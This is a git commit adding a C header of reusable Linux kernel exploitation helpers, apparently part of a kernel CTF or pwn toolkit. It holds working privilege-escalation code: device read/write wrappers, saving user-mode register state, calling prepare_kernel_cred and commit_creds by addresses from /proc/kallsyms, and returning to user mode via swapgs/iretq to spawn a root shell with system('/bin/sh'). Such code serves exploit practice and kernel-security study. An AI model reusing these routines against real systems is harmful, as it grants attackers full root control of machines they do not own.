97616b850cc16f471c2f5dc641c320ceeed05994
squirre17 <3319277663@qq.com>
2023-05-22 23:01:22 +0800

    fix #6

---
+++ inc/snippet.h
@@ -0,0 +1,78 @@
+#include "inc/common.h"
+
+int devfd = -1;
+
+void write_to_dev(char *buf, i32 sz) {
+    ACT("write %x byte to dev from buf %p", sz, (void *)buf);
+    int r = write(devfd, buf, sz);
+    assert_eq(r, sz);
+}
+
+void read_from_dev(char *buf, i32 sz) {
+    ACT("read %x byte from dev to buf %p", sz, (void *)buf);
+    int r = read(devfd, buf, sz);
+    assert_eq(r, sz);
+}
+
+u64 _cs, _ss, _sp, _rflags;
+
+void save_state() {
+
+    asm volatile (
+        ".intel_syntax noprefix;"
+        "mov _cs, cs;"
+        "mov _ss, ss;"
+        "mov _sp, rsp;"
+        "pushf;"
+        "pop _rflags;"
+        ".att_syntax;"
+    );
+
+  OK("save_state done");
+}
+
+void get_root_shell() {
+
+    if(getuid() == 0) {
+        OK("root now");
+        system("/bin/sh");
+    }else {
+        FATAL("escalate failed");
+    }
+}
+
+static void restore_state() {
+    /*
+    k_rsp -> u_rip
+             u_cs
+             u_rflags
+             u_rsp
+             u_ss
+    */
+    asm volatile(
+        ".intel_syntax noprefix;"
+        "swapgs;"
+        "mov qword ptr [rsp+0x20], %0;"
+        "mov qword ptr [rsp+0x18], %1;"
+        "mov qword ptr [rsp+0x10], %2;"
+        "mov qword ptr [rsp+0x08], %3;"
+        "mov qword ptr [rsp+0x00], %4;"
+        "iretq;"
+        ".att_syntax;"
+        : 
+        : "r"(_ss),
+          "r"(_sp),
+          "r"(_rflags),
+          "r"(_cs),
+          "r"(get_root_shell)
+    );
+    OK("restore_state done");
+}
+void get_root(u64 pkc, u64 cc) {
+    /*
+        / # grep prepare_kernel_cred /proc/kallsyms 
+        / # grep commit_cred /proc/kallsyms 
+    */
+    (* (int * (*)(void *))cc)((* (void *(*)(void *))pkc)(NULL));
+    restore_state();
+}
